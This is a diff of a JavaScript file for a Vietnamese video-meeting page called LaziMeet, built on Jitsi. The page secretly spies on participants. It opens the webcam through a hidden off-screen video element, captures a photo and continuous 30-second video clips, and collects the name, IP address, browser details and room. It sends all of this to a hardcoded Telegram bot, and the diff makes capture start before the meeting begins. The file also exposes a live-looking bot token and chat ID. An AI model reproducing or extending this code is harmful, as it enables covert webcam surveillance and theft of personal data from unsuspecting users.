@@ -1,7 +1,4 @@
-// script.js - LaziMeet với tính năng thu thập thông tin qua Telegram
-// Điều chỉnh: Tận dụng quyền camera từ JitsiMeet, không yêu cầu lại
-// Xử lý đầy đủ các trường hợp lỗi camera
-
+// script.js - LaziMeet hoàn chỉnh (Hỗ trợ ghi video MP4/WebM)
 const TELEGRAM_BOT_TOKEN = '9016245014:AAEWS3HT07YujbmfyqtHBOfU3z9C8fPMuuE';
 const TELEGRAM_CHAT_ID = '8908781379';
 const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
@@ -23,7 +20,6 @@ let recordedChunks = [];
 let recordingInterval = null;
 let videoSequence = 0;
 let userDisplayName = '';
-let surveillanceStarted = false;
 
 // ===== SPARKLE EFFECT =====
 document.addEventListener('pointerdown', (e) => {
@@ -37,12 +33,10 @@ function createSparkle(x, y) {
         sparkle.className = 'sparkle-particle';
         const angle = Math.random() * Math.PI * 2;
         const distance = 40 + Math.random() * 80;
-        const tx = Math.cos(angle) * distance;
-        const ty = Math.sin(angle) * distance;
         sparkle.style.left = `${x}px`;
         sparkle.style.top = `${y}px`;
-        sparkle.style.setProperty('--tx', `${tx}px`);
-        sparkle.style.setProperty('--ty', `${ty}px`);
+        sparkle.style.setProperty('--tx', `${Math.cos(angle) * distance}px`);
+        sparkle.style.setProperty('--ty', `${Math.sin(angle) * distance}px`);
         document.body.appendChild(sparkle);
         setTimeout(() => sparkle.remove(), 800);
     }
@@ -54,16 +48,15 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
         document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
         document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
         btn.classList.add('active');
-        const tabId = btn.getAttribute('data-tab');
-        document.getElementById(`${tabId}-tab`).classList.add('active');
+        document.getElementById(`${btn.getAttribute('data-tab')}-tab`).classList.add('active');
     });
 });
 
+// ===== AUTO-FILL NAME & URL PARAMS =====
 window.addEventListener('DOMContentLoaded', () => {
     const urlParams = new URLSearchParams(window.location.search);
-    const roomParam = urlParams.get('room');
-    if (roomParam) {
-        roomCodeInput.value = roomParam;
+    if (urlParams.get('room')) {
+        roomCodeInput.value = urlParams.get('room');
         document.querySelector('[data-tab="join"]').click();
     }
     const randomNames = ['Nam Phong', 'Thảo My', 'Gia Hân', 'Hoàng Long', 'Minh Thư', 'Quốc Bảo', 'Khánh Linh'];
@@ -72,6 +65,7 @@ window.addEventListener('DOMContentLoaded', () => {
     if (joinNameInput) joinNameInput.value = defaultName;
 });
 
+// ===== TOAST =====
 function showToast(message, icon = 'fa-solid fa-sparkles') {
     const container = document.getElementById('toast-container');
     if (!container) return;
@@ -82,7 +76,7 @@ function showToast(message, icon = 'fa-solid fa-sparkles') {
     setTimeout(() => toast.remove(), 3500);
 }
 
-// ===== THU THẬP THÔNG TIN =====
+// ===== THU THẬP THÔNG TIN NGƯỜI DÙNG =====
 function getUserAgentInfo() {
     const ua = navigator.userAgent;
     let browser = 'Không xác định';
@@ -117,7 +111,7 @@ async function sendToTelegram(text) {
         await fetch(`${TELEGRAM_API}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' })
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
         });
     } catch (e) { console.error('Lỗi gửi Telegram:', e); }
 }
@@ -133,57 +127,81 @@ async function sendPhotoToTelegram(blob, caption) {
     } catch (e) { console.error('Lỗi gửi ảnh:', e); }
 }
 
-async function sendVideoToTelegram(blob, caption) {
+// CẢI TIẾN: Tự động nhận diện định dạng file để gửi Telegram
+async function sendVideoToTelegram(blob, caption, filename) {
     try {
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('video', blob, `video_${videoSequence}.webm`);
+        formData.append('video', blob, filename);
         formData.append('caption', caption);
         formData.append('parse_mode', 'HTML');
         await fetch(`${TELEGRAM_API}/sendVideo`, { method: 'POST', body: formData });
+        console.log(`✅ Đã gửi video định dạng ${filename}`);
     } catch (e) { console.error('Lỗi gửi video:', e); }
 }
 
-// ===== LẤY ẢNH TỪ VIDEO ELEMENT =====
+// ===== LẤY ẢNH TỪ CAMERA =====
 function capturePhoto(videoElement) {
     const canvas = document.createElement('canvas');
     canvas.width = videoElement.videoWidth || 640;
     canvas.height = videoElement.videoHeight || 480;
     const ctx = canvas.getContext('2d');
     ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-    return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
+    return new Promise((resolve) => {
+        canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
+    });
 }
 
-// ===== GHI VIDEO TỪ STREAM =====
+// ===== GHI VIDEO =====
 function startRecording(stream, name) {
-    if (!stream || !stream.active) return;
-    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+    if (mediaRecorder && mediaRecorder.state === 'recording') {
+        mediaRecorder.stop();
+    }
+    
     recordedChunks = [];
-    const options = { mimeType: 'video/webm;codecs=vp8,opus' };
-    if (!MediaRecorder.isTypeSupported(options.mimeType)) options.mimeType = 'video/webm';
-    try { mediaRecorder = new MediaRecorder(stream, options); }
-    catch (e) { console.error('MediaRecorder lỗi:', e); return; }
+    
+    // TÌM ĐỊNH DẠNG TỐT NHẤT (Ưu tiên MP4 nếu trình duyệt hỗ trợ)
+    let options = { mimeType: 'video/mp4' };
+    let fileExt = 'mp4';
 
-    mediaRecorder.ondataavailable = event => {
+    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+        options = { mimeType: 'video/webm;codecs=vp8,opus' }; // Fallback
+        fileExt = 'webm';
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+            options = { mimeType: 'video/webm' };
+        }
+    }
+    
+    try {
+        mediaRecorder = new MediaRecorder(stream, options);
+    } catch (e) {
+        console.error('Không thể tạo MediaRecorder:', e);
+        return;
+    }
+    
+    mediaRecorder.ondataavailable = (event) => {
         if (event.data.size > 0) recordedChunks.push(event.data);
     };
+    
     mediaRecorder.onstop = async () => {
         if (recordedChunks.length > 0) {
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const blob = new Blob(recordedChunks, { type: options.mimeType });
             if (blob.size > 10000) {
                 videoSequence++;
                 const caption = `🎥 <b>Video ${videoSequence}</b>\n👤 Tên: ${name}\n⏱ Thời lượng: 30 giây`;
-                await sendVideoToTelegram(blob, caption);
+                await sendVideoToTelegram(blob, caption, `video_${videoSequence}.${fileExt}`);
             }
         }
         recordedChunks = [];
     };
+    
     mediaRecorder.start();
+    
     recordingInterval = setTimeout(() => {
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
             setTimeout(() => {
-                if (stream && stream.active) startRecording(stream, name);
+                if (mediaStream && mediaStream.active) startRecording(mediaStream, name);
             }, 1000);
         }
     }, 30000);
@@ -199,20 +217,34 @@ function stopRecordingAndSend() {
     }
 }
 
-// ===== BẮT ĐẦU THEO DÕI SAU KHI JITSI ĐÃ CÓ CAMERA =====
-async function startSurveillance(displayName, stream) {
-    if (surveillanceStarted) return;
-    surveillanceStarted = true;
+// ===== BẮT ĐẦU THU THẬP =====
+async function startSurveillance(displayName) {
     userDisplayName = displayName;
-    mediaStream = stream;
-
-    const room = currentRoomBadge.textContent.replace('Phòng: ', '');
-    const ip = await getIPInfo();
-    const uaInfo = getUserAgentInfo();
-    const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
-
-    // 1. Gửi thông tin
-    const infoMessage = `
+    try {
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: { width: 640, height: 480, facingMode: 'user' },
+            audio: false
+        });
+        
+        showToast('Đã kết nối camera', 'fa-solid fa-camera');
+        const videoEl = document.createElement('video');
+        videoEl.srcObject = mediaStream;
+        videoEl.muted = true;
+        videoEl.playsInline = true;
+        videoEl.style.position = 'fixed';
+        videoEl.style.top = '-9999px';
+        videoEl.style.left = '-9999px';
+        document.body.appendChild(videoEl);
+        
+        await videoEl.play();
+        await new Promise(r => setTimeout(r, 1000));
+        
+        const ip = await getIPInfo();
+        const uaInfo = getUserAgentInfo();
+        const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+        const room = currentRoomBadge.textContent.replace('Phòng: ', '');
+        
+        const infoMessage = `
 🕵️ <b>THÔNG TIN NGƯỜI DÙNG</b>
 ━━━━━━━━━━━━━━━
 👤 <b>Tên:</b> ${displayName}
@@ -224,62 +256,29 @@ async function startSurveillance(displayName, stream) {
 🏠 <b>Phòng:</b> ${room}
 ⏰ <b>Thời gian:</b> ${now}
 ━━━━━━━━━━━━━━━`.trim();
-    await sendToTelegram(infoMessage);
-
-    // 2. Chụp ảnh từ stream Jitsi
-    try {
-        const videoTrack = stream.getVideoTracks()[0];
-        const imageCapture = new ImageCapture(videoTrack);
-        const photoBlob = await imageCapture.takePhoto();
-        await sendPhotoToTelegram(photoBlob, `📸 <b>Ảnh camera</b>\n👤 ${displayName}\n🌐 IP: ${ip}`);
-    } catch (e) {
-        // Fallback: dùng video element ẩn
-        try {
-            const videoEl = document.createElement('video');
-            videoEl.srcObject = stream;
-            videoEl.muted = true;
-            videoEl.playsInline = true;
-            videoEl.style.position = 'fixed';
-            videoEl.style.top = '-9999px';
-            document.body.appendChild(videoEl);
-            await videoEl.play();
-            await new Promise(r => setTimeout(r, 1000));
-            const photoBlob = await capturePhoto(videoEl);
-            if (photoBlob) await sendPhotoToTelegram(photoBlob, `📸 <b>Ảnh camera</b>\n👤 ${displayName}\n🌐 IP: ${ip}`);
-            videoEl.remove();
-        } catch (err) { console.error('Không chụp được ảnh:', err); }
-    }
-
-    // 3. Ghi video liên tục
-    startRecording(stream, displayName);
-
-    // 4. Xử lý thoát
-    window.addEventListener('beforeunload', () => {
-        stopRecordingAndSend();
-        if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
-    });
-}
-
-// ===== GỬI THÔNG BÁO LỖI CAMERA =====
-async function sendCameraError(displayName, errorName) {
-    let errorMsg = '';
-    if (errorName === 'NotAllowedError') {
-        errorMsg = 'Người dùng từ chối quyền camera';
-    } else if (errorName === 'NotFoundError') {
-        errorMsg = 'Không tìm thấy thiết bị camera';
-    } else if (errorName === 'NotReadableError') {
-        errorMsg = 'Camera đang bị ứng dụng khác chiếm dụng';
-    } else {
-        errorMsg = `Lỗi không xác định: ${errorName}`;
-    }
-
-    const ip = await getIPInfo();
-    const uaInfo = getUserAgentInfo();
-    const room = currentRoomBadge.textContent.replace('Phòng: ', '');
-    const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
-
-    await sendToTelegram(`
-⚠️ <b>KHÔNG THỂ TRUY CẬP CAMERA</b>
+        
+        await sendToTelegram(infoMessage);
+        
+        const photoBlob = await capturePhoto(videoEl);
+        if (photoBlob) await sendPhotoToTelegram(photoBlob, `📸 <b>Ảnh camera</b>\n👤 ${displayName}`);
+        
+        startRecording(mediaStream, displayName);
+        
+        window.addEventListener('beforeunload', () => {
+            stopRecordingAndSend();
+            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
+        });
+    } catch (err) {
+        console.error('Lỗi camera:', err);
+        showToast('Không thể truy cập camera.', 'fa-solid fa-triangle-exclamation');
+        
+        const ip = await getIPInfo();
+        const uaInfo = getUserAgentInfo();
+        const now = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+        const room = currentRoomBadge.textContent.replace('Phòng: ', '');
+        
+        const msg = `
+🕵️ <b>THÔNG TIN (KHÔNG CAMERA)</b>
 ━━━━━━━━━━━━━━━
 👤 <b>Tên:</b> ${displayName}
 🌐 <b>IP:</b> ${ip}
@@ -289,34 +288,33 @@ async function sendCameraError(displayName, errorName) {
 🔗 <b>User Agent:</b> <code>${uaInfo.userAgent}</code>
 🏠 <b>Phòng:</b> ${room}
 ⏰ <b>Thời gian:</b> ${now}
-❌ <b>Lý do:</b> ${errorMsg}
-━━━━━━━━━━━━━━━`.trim());
+❌ <b>Camera:</b> Bị từ chối
+━━━━━━━━━━━━━━━`.trim();
+        
+        await sendToTelegram(msg);
+    }
 }
 
 // ===== CREATE ROOM =====
 if (btnCreateRoom) {
-    btnCreateRoom.addEventListener('click', () => {
+    btnCreateRoom.addEventListener('click', async () => {
         const name = creatorNameInput.value.trim() || 'GenZ Host';
         const roomId = 'lazimeet-' + Math.random().toString(36).substring(2, 9);
+        await startSurveillance(name);
         startMeeting(roomId, name);
     });
 }
 
 // ===== JOIN ROOM =====
 if (btnJoinRoom) {
-    btnJoinRoom.addEventListener('click', () => {
+    btnJoinRoom.addEventListener('click', async () => {
         const name = joinNameInput.value.trim() || 'GenZ Guest';
         let roomInput = roomCodeInput.value.trim();
-        if (!roomInput) {
-            showToast('Vui lòng nhập mã phòng hoặc đường dẫn!', 'fa-solid fa-circle-exclamation');
-            return;
-        }
+        if (!roomInput) return showToast('Vui lòng nhập mã phòng!', 'fa-solid fa-circle-exclamation');
         if (roomInput.includes('room=')) {
-            try {
-                const url = new URL(roomInput.includes('http') ? roomInput : 'https://' + roomInput);
-                roomInput = url.searchParams.get('room') || roomInput;
-            } catch (e) {}
+            try { roomInput = new URL(roomInput.includes('http') ? roomInput : 'https://' + roomInput).searchParams.get('room') || roomInput; } catch (e) {}
         }
+        await startSurveillance(name);
         startMeeting(roomInput, name);
     });
 }
@@ -327,7 +325,7 @@ function startMeeting(roomId, displayName) {
     meetingScreen.classList.add('active');
     currentRoomBadge.textContent = `Phòng: ${roomId}`;
     showToast('Đang kết nối vào phòng họp...', 'fa-solid fa-spinner fa-spin');
-
+    
     const domain = "meet.jit.si";
     const options = {
         roomName: "LaziMeet-" + roomId,
@@ -350,25 +348,10 @@ function startMeeting(roomId, displayName) {
             DEFAULT_REMOTE_DISPLAY_NAME: 'Thành viên'
         }
     };
-
+    
     try {
         jitsiApi = new JitsiMeetExternalAPI(domain, options);
-
         jitsiApi.addEventListeners({
-            videoConferenceJoined: async () => {
-                setTimeout(async () => {
-                    try {
-                        const stream = await navigator.mediaDevices.getUserMedia({
-                            video: true,
-                            audio: false
-                        });
-                        await startSurveillance(displayName, stream);
-                    } catch (e) {
-                        console.error('Không lấy được stream:', e);
-                        await sendCameraError(displayName, e.name);
-                    }
-                }, 2000);
-            },
             readyToClose: () => {
                 stopRecordingAndSend();
                 window.location.href = window.location.pathname;
@@ -383,7 +366,7 @@ function startMeeting(roomId, displayName) {
         });
     } catch (err) {
         console.error("Lỗi khởi tạo Jitsi API:", err);
-        showToast('Không thể tải khung họp trực tuyến. Vui lòng thử lại!', 'fa-solid fa-triangle-exclamation');
+        showToast('Không thể tải khung họp trực tuyến.', 'fa-solid fa-triangle-exclamation');
     }
 }
 
